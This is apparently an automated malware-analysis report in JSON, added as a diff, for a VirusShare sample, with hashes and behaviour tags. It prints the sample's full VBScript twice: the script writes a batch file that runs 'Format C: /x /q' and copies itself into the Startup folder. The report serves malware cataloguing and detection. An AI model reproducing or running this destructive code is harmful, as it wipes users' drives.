@@ -1,0 +1,42 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CopyFile": "May copy a file",
+            "CreateObject": "May create an OLE object",
+            "CreateTextFile": "May create a text file"
+        },
+        "macro": "\nDim FSO, DieHardDrive, Parent\nParent = Wscript.ScriptFullName\nSet FSO = CreateObject(\"Scripting.FileSystemObject\")\nSet DieHarddrive = FSO.CreateTextFile(\"C:\\DieHardDrive.bat\", True)\n\tDieHardDrive.WriteLine \"Format C: /x /q\"\nDieHardDrive.FileClose\nFSO.CopyFile Parent, \"c:\\Start Menu\\Programs\\StartUp\\DieHardDrive.bat\"\n\t"
+    },
+    "filename": "VirusShare_0a54971e0bf8797d1b80d81dba9666bd",
+    "filesize": 328,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "0a54971e0bf8797d1b80d81dba9666bd",
+        "sha1": "7b2063dc02f439267172f40d43a24d9c5f78c0c2",
+        "sha256": "b437096a3ac01edb24d7623a53e9b01457f25bb60bae6382cc4138ba9e9b10fe"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Dim FSO, DieHardDrive, Parent",
+            "Parent = Wscript.ScriptFullName",
+            "Set FSO = CreateObject(\"Scripting.FileSystemObject\")",
+            "Set DieHarddrive = FSO.CreateTextFile(\"C:\\DieHardDrive.bat\", True)",
+            "\tDieHardDrive.WriteLine \"Format C: /x /q\"",
+            "DieHardDrive.FileClose",
+            "FSO.CopyFile Parent, \"c:\\Start Menu\\Programs\\StartUp\\DieHardDrive.bat\""
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.260269",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
